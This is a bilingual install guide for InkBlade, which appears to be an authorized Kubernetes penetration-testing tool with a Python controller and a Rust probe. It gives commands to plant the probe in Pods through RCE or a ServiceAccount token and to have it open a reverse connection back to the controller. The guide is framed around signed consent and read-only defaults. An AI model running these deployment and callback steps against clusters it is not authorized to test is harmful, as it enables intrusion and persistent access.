# Install / 安装

> 控制端：Python 3.10–3.13。目标端：Linux amd64/arm64 静态 Rust 探针。
> 安装完成后运行 `inkblade up` 打开接入向导。

## 中文

安装 InkBlade 时，先把它拆成两个独立的东西：控制端和目标端。控制端是 Python 程序，跑在你的工作站或跳板机上，负责授权、编排和报告；目标端是一个静态链接的 Rust 二进制，只存在于被授权的 Pod 里，负责执行模板和产出证据。两者通过帧协议通信，不共享文件系统，也不共享 Python 环境。

### 环境要求

| 组件 | 版本/形态 | 说明 |
|---|---|---|
| 控制端 Python | 3.10 – 3.13 | 只用标准库；不需要编译器 |
| InkBlade 控制器 | 源码检出或 wheel | `inkblade` 命令或 `python -m inkblade` |
| 探针二进制 | Linux amd64 或 arm64 | 静态链接；目标 Pod 不需要 Python |
| kubectl | 1.26+ | 可选；只有 `kubectl` 批量 bootstrap 路径需要 |
| kubeconfig | 有授权的最小权限 | 可选；foothold/external 接入不需要 |
| 授权记录 | consent/ROE | 没有签署记录不执行 |
| 磁盘 | 约 300 MB 起 | 证据随项目增长 |

目标 Pod 的底线要求不高：Linux 内核，能执行静态 ELF，有一个可写临时目录或 `memfd_create`，并且探针进程能继承 Pod 的 namespace、cgroup 和 SA。它不需要 Python、Bash、curl 或 kubectl。

### 安装控制器

```bash
python -m pip install -e .
python -m inkblade --help
```

如果 `pip install` 被策略禁止，跳过它，直接在仓库根目录用 `python -m inkblade ...`。功能完全一样，损失的只是短命令。Windows 控制端可用；探针只支持 Linux，Windows 上不要运行 `inkblade-probe`，只把它复制到目标。

### 准备探针

发布包通常包含两个架构：

```bash
sha256sum -c SHA256SUMS
```

- `inkblade-probe-linux-amd64`
- `inkblade-probe-linux-arm64`

目标节点是 x86_64 就用 amd64，是 aarch64 就用 arm64。期望结果是静态链接：`file` 显示 statically linked，`ldd` 返回 “not a dynamic executable”。如果 `ldd` 列出一串 `.so`，说明拿到的是动态构建，换发布物或重新构建，不要硬跑。

本地构建只在需要自定义 target 时做：

```bash
rustup target add x86_64-unknown-linux-musl
cargo build --release --target x86_64-unknown-linux-musl
cargo build --release --target aarch64-unknown-linux-musl
```

构建产物在 `target/<target>/release/inkblade-probe`。构建机需要 Rust 1.75+ 和 musl target；目标机不需要。

### 第一次接入

```bash
python -m inkblade up --no-consent
```

`up` 创建工作区、打印一次性 admin 密码，并在 `127.0.0.1:8765` 提供本地控制台。浏览器登录后签授权记录，或执行：

```bash
python -m inkblade quickstart
```

`quickstart` 用五个问题确定目标、范围、级别、用户与签署。`inkblade roe` 可以随时查看当前记录。

默认立足点是普通、最低权限的 Pod：非 root、无 hostPath/privileged、无 kubeconfig，只有出站 TCP。已有探针时，不需要 kubeconfig，也不需要重新投放：

```bash
python -m inkblade probe list
python -m inkblade channel listen
```

在 Pod 内让探针回连：

```bash
inkblade-probe reverse --host <controller> --port <port>
```

首次投放用已有立足点：

```bash
python -m inkblade session open \
  --mode foothold \
  --target <target> \
  --credential-source pod-shell \
  --namespace <namespace> \
  --pod <pod>

python -m inkblade probe deploy \
  --session <session-id> \
  --via rce \
  --binary ./inkblade-probe-linux-amd64 \
  --probe-token-file ./probe.token \
  --allow-write
```

随后在 Pod 内让探针回连控制端。`--via rce` 适合低权限 Pod；`--via sa-token` 使用已有 ServiceAccount token。`--mode external --proof @proof.json` 用于只有可达服务的场景，先提交有界证明，再经授权 RCE 或回调投放。看到 `probe list` 里有新的 `probe-...`，并且 `probe collect` 的快照里 SA、挂载、网络接口和 GPU 设备都符合预期，再跑检测。子探针由父探针用 `probe upload` + `probe spawn` 投放并回连。

可选：持有运维 kubeconfig、需要一次给多个 Pod 做 bootstrap 时，使用 `session open --mode kubeconfig --kubeconfig <path>` 与 `probe deploy --via kubectl`。这是高级路径，不是首次接入的前置步骤。

### 容器与 Kubernetes

控制端可以打成镜像：

```bash
docker build -t inkblade:0.2.0 .
docker run --rm -v inkblade-data:/data inkblade:0.2.0 up
```

Helm 安装：

```bash
helm lint deploy/helm/inkblade
helm install inkblade deploy/helm/inkblade \
  --namespace inkblade --create-namespace
helm get notes inkblade --namespace inkblade
```

默认值刻意保守：只读、uid 10001、只读根文件系统、一块 PVC 存证据。写动词要同时打开 `readOnly=false` 和 `rbac.allowWrite=true`，并且工作区里要有签署授权。卸载不会删除 PVC，因为证据要比 release 活得久。

控制端容器不包含探针运行时依赖。探针二进制通过挂载或发布包带进去。

### 离线安装

离线环境需要带四样东西：控制器 wheel（或源码树）、Python 3.10+ 解释器、两个架构的探针二进制、模板与规则包。除此之外不需要包索引、模型权重或外发端点。

```bash
python -m pip wheel . --no-deps -w dist/
python -m pip install --no-index --find-links dist/ inkblade
```

容器路线用 `docker save` 和 `docker load`；目标集群没有 Helm 时，用 `helm template` 渲染成普通 YAML。校验在隔离边界两侧都做一次：

```bash
sha256sum -c SHA256SUMS
```

### 工作区布局

```
<workspace>/
├── users.json              账号与角色
├── consent/                签署记录（每窗口一份）
├── sessions/<id>/          会话元数据、范围、时间窗
├── probes/<id>/            探针身份、投放方式、父子关系、清理回执
├── templates/              模板副本（可选；默认读仓库）
├── evidence/<session>/     结果 JSON、步骤日志、manifest
├── reports/<session>/      双语报告
└── rules/<session>/        规则包与重放矩阵
```

`--workspace` 指向根目录。证据不写到工作区之外，除非显式导出。工作区里的 `probes/<id>/` 是审计重点：投放方式、token 文件是否删除、子探针是否清理，都在这里。

### 环境变量

| 变量 | 用途 |
|---|---|
| `INKBLADE_DATA` | 覆盖数据根目录 |
| `INKBLADE_HOME` | 覆盖工作区默认路径 |
| `INKBLADE_TOKEN` | 本地控制台 API token（可选） |
| `INKBLADE_REPORT_KEY` | 报告包加密密钥（可选） |
| `INKBLADE_PROBE_BIN` | 默认探针二进制路径 |
| `INKBLADE_KUBECONFIG` | 默认 kubeconfig 路径 |
| `INKBLADE_LOG_LEVEL` | `info` / `debug` / `warn` |

探针侧不读这些变量。它只读 `--token-file`、`--read-only`、`--allow-write` 等显式参数。环境变量越少，目标侧行为越可复现。

### 指向集群之前

先读 `SECURITY.md` 与 `docs/FAQ.md` 的授权与安全边界。再确认三件事：consent 覆盖了目标、级别和时间窗；探针投放方式有清理路径；证据目录的保留期和访问权限已经定好。三件事缺一件，就不要开始。

第一次会话只做只读。只读不是“保守”，它是把变量分开：先确认探针看到的世界，再决定要不要写。写操作一旦开始，备份、回滚和证据链都会变复杂。

### 卸载

```bash
python -m pip uninstall inkblade
```

工作区不会自动删除。证据与签署记录按你的保留策略处理；Helm 卸载不删除 PVC。

---

## English

Install the controller first, then the probe. The controller is Python 3.10–3.13 and needs no compiler. The probe is a static Linux binary for amd64 or arm64. The target Pod needs no Python, shell, curl or kubectl.

```bash
python -m pip install -e .
python -m inkblade up
```

`up` creates the workspace, prints a one-time admin password and serves the local console. Sign the record with `quickstart` or in the console. The default foothold is a least-privilege Pod with outbound TCP only: the controller listens with `channel listen`, the probe connects back with `inkblade-probe reverse`, and first delivery uses `session open --mode foothold` plus `probe deploy --via rce|sa-token`. No kubeconfig is required; `session open --mode kubeconfig` is the optional batch bootstrap for several Pods.

Verify the probe hash and architecture before deployment. A dynamic build is not a release binary; replace it or rebuild with musl.

The first session should be read-only and narrow: one namespace, one Pod, one template. Confirm the probe tree, the snapshot and the evidence path before widening the scope.

For air-gapped installs, carry the controller wheel, a Python interpreter, both probe binaries, templates and rule packs.

Deployment options: `docker build -t inkblade:0.2.0 .` or `helm install inkblade deploy/helm/inkblade --namespace inkblade --create-namespace`. The chart is read-only by default; writes need `readOnly=false`, `rbac.allowWrite=true` and a signed record.

Deployment prerequisites and write-permission checks: [`PROBE-DEPLOY.md`](PROBE-DEPLOY.md).
